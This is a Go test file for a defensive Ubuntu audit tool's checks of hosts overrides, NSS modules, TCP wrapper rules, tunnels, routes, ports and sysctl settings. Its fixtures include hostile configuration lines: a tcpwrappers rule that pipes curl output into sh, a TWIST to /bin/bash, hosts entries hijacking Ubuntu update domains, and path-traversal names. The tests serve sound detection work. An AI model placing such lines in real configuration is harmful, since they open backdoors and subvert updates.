package checks

import (
	"reflect"
	"strings"
	"testing"

	"ubuntu-sys-audit/internal/model"
)

func TestHostsOverrides(t *testing.T) {
	src := strings.Join([]string{
		"127.0.0.1 localhost",
		"127.0.1.1 web01",
		"::1 ip6-localhost",
		"# 203.0.113.9 archive.ubuntu.com",
		"127.0.0.1 security.ubuntu.com # blocked",
		"203.0.113.5 mirror.example.com ESM.Ubuntu.com.",
		"10.0.0.5 archive.ubuntu.com",
		"10.0.0.6 notubuntu.com",
		"10.0.0.7 api.snapcraft.io",
		"10.0.0.8 host1.canonical.com",
		"not-an-address archive.ubuntu.com",
	}, "\n")
	suspicious, private := hostsOverrides(src, "host1.canonical.com")
	wantSuspicious := []string{"127.0.0.1 security.ubuntu.com", "203.0.113.5 mirror.example.com ESM.Ubuntu.com."}
	wantPrivate := []string{"10.0.0.5 archive.ubuntu.com", "10.0.0.7 api.snapcraft.io"}
	if !reflect.DeepEqual(suspicious, wantSuspicious) {
		t.Errorf("suspicious: got %v, want %v", suspicious, wantSuspicious)
	}
	if !reflect.DeepEqual(private, wantPrivate) {
		t.Errorf("private: got %v, want %v", private, wantPrivate)
	}
}

func TestHostsOverrideSeverity(t *testing.T) {
	if f := hostsOverrideFinding([]string{"127.0.0.1 security.ubuntu.com"}, nil); f.Severity != model.High {
		t.Errorf("blocking a domain should be high: %v", f.Severity)
	}
	if f := hostsOverrideFinding(nil, []string{"10.0.0.5 archive.ubuntu.com"}); f.Severity != model.Medium || !strings.Contains(f.Detail, "internal mirror") {
		t.Errorf("a private address may be a mirror: %+v", f)
	}
	f := hostsOverrideFinding([]string{"a"}, []string{"b"})
	if f.Severity != model.High || len(f.Evidence) != 2 {
		t.Errorf("both kinds: %+v", f)
	}
}

func TestUnknownNSSModules(t *testing.T) {
	src := strings.Join([]string{
		"# hosts: commented",
		"passwd:         files systemd sss",
		"shadow:         files evil",
		"hosts:          files mdns4_minimal [NOTFOUND=return] dns evil",
		"netgroup:       nis [ NOTFOUND=return UNAVAIL=continue ] other",
	}, "\n")
	want := map[string][]string{"evil": {"shadow", "hosts"}, "other": {"netgroup"}}
	if got := unknownNSSModules(src); !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func TestNSSFindings(t *testing.T) {
	src := "passwd: files rogue packaged absent\n"
	libraries := func(module string) []string {
		switch module {
		case "rogue":
			return []string{"/usr/lib/libnss_rogue.so.2"}
		case "packaged":
			return []string{"/usr/lib/x86_64-linux-gnu/libnss_packaged.so.2"}
		}
		return nil
	}
	owned := func(path string) bool { return strings.Contains(path, "packaged") }
	got := nssFindings(src, libraries, owned)
	if len(got) != 2 {
		t.Fatalf("want 2 findings, got %+v", got)
	}
	if got[0].ID != "integrity.nss_unmanaged" || got[0].Severity != model.High || !strings.Contains(got[0].Evidence[0], "libnss_rogue") {
		t.Errorf("a library outside packages: %+v", got[0])
	}
	other := strings.Join(got[1].Evidence, "\n")
	if got[1].Severity != model.Info || !strings.Contains(other, "packaged (used for passwd): from a package") || !strings.Contains(other, "absent (used for passwd): no library found") {
		t.Errorf("other modules: %+v", got[1])
	}
	if got := nssFindings("passwd: files systemd\nhosts: files dns\n", libraries, owned); len(got) != 0 {
		t.Errorf("a stock file should report nothing: %+v", got)
	}
}

func TestNSSLibrariesRefusesUnsafeNames(t *testing.T) {
	for _, name := range []string{"../../tmp/x", "a*", "a/b", "a b", ""} {
		if got := nssLibraries(name); got != nil {
			t.Errorf("%q should not be looked up: %v", name, got)
		}
	}
}

func TestTCPWrapperCommands(t *testing.T) {
	src := strings.Join([]string{
		"# sshd: ALL: spawn commented",
		"sshd: 10.0.0.0/8",
		"ALL: ALL: DENY",
		"sshd: ALL: spawn /bin/sh -c 'curl x | sh'",
		"in.telnetd: ALL : TWIST /bin/bash",
		"vsftpd: 192.0.2.1 : severity auth.info : \\",
		"    spawn /bin/logger hi",
		"spawnd: ALL",
	}, "\n")
	got := tcpWrapperCommands(src)
	if len(got) != 3 {
		t.Fatalf("want 3 rules, got %q", got)
	}
	if !strings.Contains(got[2], "spawn /bin/logger") {
		t.Errorf("a continued line should be joined: %q", got[2])
	}
}

func TestTunnelKind(t *testing.T) {
	for _, c := range []struct{ devType, arpType, tunFlags, want string }{
		{"", "65534", "0x1001", "tun"},
		{"", "1", "0x1002", "tap"},
		{"wireguard", "65534", "", "wireguard"},
		{"vxlan", "1", "", "vxlan"},
		{"", "768", "", "ipip"},
		{"", "776", "", "sit"},
		{"", "778", "", "gre"},
		{"", "1", "", ""},
		{"bridge", "1", "", ""},
		{"", "772", "", ""},
	} {
		if got := tunnelKind(c.devType, c.arpType, c.tunFlags); got != c.want {
			t.Errorf("tunnelKind(%q, %q, %q) = %q, want %q", c.devType, c.arpType, c.tunFlags, got, c.want)
		}
	}
}

func TestTunInterfaceFromFdinfo(t *testing.T) {
	if got := tunInterfaceFromFdinfo("pos:\t0\nflags:\t02\nmnt_id:\t9\nino:\t12\niff:\ttun0\n"); got != "tun0" {
		t.Errorf("got %q", got)
	}
	if got := tunInterfaceFromFdinfo("pos:\t0\nflags:\t02\n"); got != "" {
		t.Errorf("a descriptor not attached to an interface: %q", got)
	}
}

func TestDefaultRoutes(t *testing.T) {
	const route4 = `Iface	Destination	Gateway 	Flags	RefCnt	Use	Metric	Mask		MTU	Window	IRTT
eth0	00000000	0100000A	0003	0	0	100	00000000	0	0	0
eth0	0000000A	00000000	0001	0	0	100	00FFFFFF	0	0	0
wg0	00000000	00000000	0001	0	0	200	00000000	0	0	0
eth1	00000000	0100000A	0002	0	0	300	00000000	0	0	0
`
	got := ipv4DefaultRoutes(route4)
	if len(got) != 2 || got[0].Iface != "eth0" || got[1].Iface != "wg0" {
		t.Fatalf("ipv4: %+v", got)
	}
	if !strings.Contains(got[0].Line, "via 10.0.0.1 dev eth0") {
		t.Errorf("the gateway should be decoded: %q", got[0].Line)
	}

	const zero = "00000000000000000000000000000000"
	route6 := strings.Join([]string{
		zero + " 00 " + zero + " 00 fe800000000000000000000000000001 00000400 00000001 00000000 00000003 eth0",
		zero + " 00 " + zero + " 00 " + zero + " ffffffff 00000001 00000000 00200200 lo",
		"20010db8000000000000000000000000 40 " + zero + " 00 " + zero + " 00000100 00000001 00000000 00000001 eth0",
	}, "\n")
	got6 := ipv6DefaultRoutes(route6)
	if len(got6) != 1 || got6[0].Iface != "eth0" || !strings.Contains(got6[0].Line, "via fe80::1") {
		t.Errorf("ipv6: %+v", got6)
	}
}

func TestRoutesFinding(t *testing.T) {
	eth0 := defaultRoute{"eth0", "IPv4 default via 10.0.0.1 dev eth0 metric 100"}
	eth1 := defaultRoute{"eth1", "IPv4 default via 10.0.1.1 dev eth1 metric 200"}
	wg0 := defaultRoute{"wg0", "IPv4 default via 0.0.0.0 dev wg0 metric 50"}
	tunnels := map[string]bool{"wg0": true}
	if _, ok := routesFinding([]defaultRoute{eth0}, []defaultRoute{{"eth0", "IPv6"}}, tunnels); ok {
		t.Error("one route per family on one interface is normal")
	}
	if _, ok := routesFinding([]defaultRoute{eth0, eth0}, nil, tunnels); ok {
		t.Error("two routes on one interface are not several links")
	}
	f, ok := routesFinding([]defaultRoute{eth0, eth1}, nil, tunnels)
	if !ok || f.Severity != model.Info || !strings.Contains(f.Title, "Several") {
		t.Errorf("two interfaces: %+v", f)
	}
	f, ok = routesFinding([]defaultRoute{wg0}, nil, tunnels)
	if !ok || f.Severity != model.Info || !strings.Contains(f.Title, "tunnel") {
		t.Errorf("through a tunnel: %+v", f)
	}
}

func TestForwardingFindingEvidence(t *testing.T) {
	f := forwardingFinding("1", "0")
	if f.Severity != model.Medium || !reflect.DeepEqual(f.Evidence, []string{"net.ipv4.ip_forward = 1"}) {
		t.Errorf("ipv4 only: %+v", f)
	}
	f = forwardingFinding("0", "1")
	if !reflect.DeepEqual(f.Evidence, []string{"net.ipv6.conf.all.forwarding = 1"}) {
		t.Errorf("ipv6 only: %+v", f)
	}
}

func TestNewRiskyPorts(t *testing.T) {
	for port, want := range map[uint16]string{161: "SNMP", 631: "CUPS", 873: "rsync", 2379: "etcd", 3389: "RDP", 5672: "RabbitMQ", 15672: "RabbitMQ", 6443: "Kubernetes API", 9090: "Prometheus"} {
		if got := riskyPorts[port].name; got != want {
			t.Errorf("port %d: got %q, want %q", port, got, want)
		}
	}
	// One finding covers both RabbitMQ ports, because they share a key.
	if riskyPorts[5672] != riskyPorts[15672] {
		t.Error("RabbitMQ ports should group into one finding")
	}
}

func TestNewSysctlRules(t *testing.T) {
	rule := func(name string) sysctlRule {
		for _, r := range sysctlRules {
			if r.name == name {
				return r
			}
		}
		t.Fatalf("no rule for %s", name)
		return sysctlRule{}
	}
	for _, c := range []struct {
		name, value string
		weak        bool
	}{
		{"net.ipv4.conf.all.rp_filter", "0", true},
		{"net.ipv4.conf.all.rp_filter", "1", false},
		{"net.ipv4.conf.all.rp_filter", "2", false},
		{"net.ipv4.conf.all.send_redirects", "1", true},
		{"net.ipv4.conf.all.send_redirects", "0", false},
		{"net.ipv6.conf.all.accept_redirects", "1", true},
		{"net.ipv6.conf.all.accept_redirects", "0", false},
		{"net.ipv6.conf.all.accept_source_route", "1", true},
		{"net.ipv6.conf.all.accept_source_route", "0", false},
		{"net.ipv6.conf.all.accept_source_route", "-1", false},
	} {
		r := rule(c.name)
		if got := r.bad(c.value); got != c.weak {
			t.Errorf("%s = %s: weak %v, want %v", c.name, c.value, got, c.weak)
		}
		if r.sev != model.Info {
			t.Errorf("%s should stay informational, got %v", c.name, r.sev)
		}
	}
}
